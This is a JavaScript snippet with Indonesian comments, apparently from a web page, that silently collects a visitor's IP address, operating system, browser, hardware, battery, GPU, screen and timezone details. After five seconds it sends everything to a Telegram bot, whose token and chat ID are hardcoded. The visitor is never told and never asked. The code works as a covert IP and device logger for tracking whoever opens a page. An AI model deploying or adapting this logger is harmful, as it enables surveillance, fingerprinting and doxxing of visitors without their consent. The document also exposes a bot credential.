        // Fungsi untuk mendapatkan IP pengguna
        async function fetchIP() {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            document.getElementById('ip').innerText = data.ip;
        }

        // Fungsi untuk mendeteksi sistem operasi perangkat
        function detectOS() {
            const platform = navigator.platform.toLowerCase();
            let os = "Tidak diketahui";

            if (platform.includes("win")) {
                os = "Windows";
            } else if (platform.includes("mac")) {
                os = "macOS";
            } else if (platform.includes("linux")) {
                os = "Linux";
            } else if (/android/i.test(navigator.userAgent)) {
                os = "Android";
            } else if (/iphone|ipod|ipad/i.test(navigator.userAgent)) {
                os = "iOS";
            }

            document.getElementById('os').innerText = os;
        }

        // Fungsi untuk mendapatkan informasi memori perangkat (RAM)
        function fetchDeviceMemory() {
            const deviceMemory = navigator.deviceMemory || "Tidak tersedia";
            document.getElementById('deviceMemory').innerText = `${deviceMemory} GB`;
        }

        // Fungsi untuk mendapatkan jumlah inti CPU
        function fetchCPUCores() {
            const cpuCores = navigator.hardwareConcurrency || "Tidak tersedia";
            document.getElementById('cpuCores').innerText = `${cpuCores} Inti`;
        }

        // Fungsi untuk mendapatkan informasi jenis koneksi jaringan
        function detectNetworkType() {
            if ('connection' in navigator) {
                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                const networkType = connection.effectiveType || 'Tidak tersedia';
                document.getElementById('networkType').innerText = networkType;
            } else {
                document.getElementById('networkType').innerText = 'Tidak mendukung deteksi jaringan';
            }
        }

        // Ambil data perangkat pengguna
        function getDeviceInfo() {
            document.getElementById('browser').innerText = navigator.userAgent;
            document.getElementById('platform').innerText = navigator.platform;

            // Model perangkat (tergantung pada user-agent)
            document.getElementById('deviceModel').innerText = navigator.userAgent;
        }

        // Fungsi untuk mendapatkan timezone
        function fetchTimezone() {
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            document.getElementById('timezone').innerText = timezone;
        }

        // Fungsi untuk mendapatkan informasi baterai
        function fetchBatteryStatus() {
            navigator.getBattery().then(function(battery) {
                const batteryInfo = `${battery.level * 100}% - ${battery.charging ? 'Sedang Mengisi Daya' : 'Tidak Mengisi Daya'}`;
                document.getElementById('battery').innerText = batteryInfo;
            });
        }

        // Fungsi untuk mendapatkan DPI Layar
        function getScreenInfo() {
            const screenWidth = window.screen.width;
            const screenHeight = window.screen.height;
            const dpi = Math.sqrt(Math.pow(screenWidth, 2) + Math.pow(screenHeight, 2)) / window.screen.availWidth;
            const screenResolution = `${screenWidth} x ${screenHeight}`;
            const screenType = window.screen.orientation.type;

            document.getElementById('screenResolution').innerText = screenResolution;
            document.getElementById('dpi').innerText = dpi.toFixed(2);
            document.getElementById('screenType').innerText = screenType;
        }

        // Fungsi untuk mendapatkan orientasi layar
        function fetchScreenOrientation() {
            const orientation = screen.orientation || {type: "Tidak tersedia"};
            document.getElementById('screenOrientation').innerText = orientation.type;
        }

        // Fungsi untuk mendapatkan GPU Vendor dan GPU Renderer
        function getGPUInfo() {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');

            if (debugInfo) {
                const gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                const gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);

                document.getElementById('gpuVendor').innerText = gpuVendor || 'Tidak ditemukan';
                document.getElementById('gpuRenderer').innerText = gpuRenderer || 'Tidak ditemukan';
            } else {
                document.getElementById('gpuVendor').innerText = 'Tidak mendukung WebGL Debug';
                document.getElementById('gpuRenderer').innerText = 'Tidak mendukung WebGL Debug';
            }
        }

        // Fungsi untuk mendapatkan Tanggal Akses dalam format yang lebih sesuai
        function getAccessDate() {
            const date = new Date();
            const day = String(date.getDate()).padStart(2, '0');
            const month = String(date.getMonth() + 1).padStart(2, '0'); // Bulan dimulai dari 0
            const year = date.getFullYear();
            const hours = String(date.getHours()).padStart(2, '0');
            const minutes = String(date.getMinutes()).padStart(2, '0');
            const seconds = String(date.getSeconds()).padStart(2, '0');

            const formattedDate = `${day}-${month}-${year} ${hours}:${minutes}:${seconds}`;
            document.getElementById('date').innerText = formattedDate;
        }

        // Kirim data ke bot Telegram
        async function sendToTelegram(message) {
            const token = '8144414708:AAEt3Lc1nonr8R07yIfyBGUXUarEnFnIgnU'; // Ganti dengan token bot Anda
            const chatId = '6600305848'; // Ganti dengan ID chat Telegram pemilik
            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

            await fetch(url);
        }

        // Gabungkan informasi dan kirim ke bot Telegram
        function collectAndSendData() {
            const ip = document.getElementById('ip').innerText;
            const date = document.getElementById('date').innerText;
            const battery = document.getElementById('battery').innerText;
            const timezone = document.getElementById('timezone').innerText;
            const os = document.getElementById('os').innerText;
            const deviceMemory = document.getElementById('deviceMemory').innerText;
            const cpuCores = document.getElementById('cpuCores').innerText;
            const networkType = document.getElementById('networkType').innerText;
            const browser = navigator.userAgent;
            const platform = navigator.platform;
            const deviceModel = document.getElementById('deviceModel').innerText;
            const gpuVendor = document.getElementById('gpuVendor').innerText;
            const gpuRenderer = document.getElementById('gpuRenderer').innerText;
            const screenResolution = document.getElementById('screenResolution').innerText;
            const dpi = document.getElementById('dpi').innerText;
            const screenType = document.getElementById('screenType').innerText;
            const screenOrientation = document.getElementById('screenOrientation').innerText;

            const message = `
                Informasi Pengguna:
                IP Address: ${ip}
                Tanggal Akses: ${date}
                Baterai: ${battery}
                Timezone: ${timezone}
                Sistem Operasi: ${os}
                Memori Perangkat: ${deviceMemory}
                CPU Cores: ${cpuCores}
                Jenis Koneksi Jaringan: ${networkType}

                Informasi Perangkat:
                Browser: ${browser}
                Platform: ${platform}
                Model Perangkat: ${deviceModel}
                GPU Vendor: ${gpuVendor}
                GPU Renderer: ${gpuRenderer}
                Resolusi Layar: ${screenResolution}
                DPI Layar: ${dpi}
                Jenis Layar: ${screenType}
                Orientasi Layar: ${screenOrientation}
            `;

            sendToTelegram(message);
        }

        // Inisialisasi
        fetchIP();
        getDeviceInfo();
        detectOS();
        fetchTimezone();
        fetchDeviceMemory();
        fetchCPUCores();
        fetchBatteryStatus();
        getScreenInfo();
        fetchScreenOrientation();
        getGPUInfo();
        detectNetworkType();
        getAccessDate();

        // Kirim data setelah beberapa detik
        setTimeout(collectAndSendData, 5000); // Kirim setelah 5 detik